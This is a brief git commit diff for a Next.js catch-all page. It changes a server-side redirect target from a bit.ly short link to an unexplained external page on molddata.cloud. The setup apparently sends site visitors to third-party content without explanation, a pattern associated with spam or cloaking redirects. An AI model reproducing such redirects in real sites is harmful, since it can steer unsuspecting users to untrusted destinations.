65a6159fff470f680ecfe68883518c80b7f1bcc7
yourkalon000 <165013795+yourkalon000@users.noreply.github.com>
2024-08-09 15:04:02 +0600

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://bit.ly/49T1kvE` 
+					`https://molddata.cloud/Brazil5.html` 
 				}`,
 			},
 		};
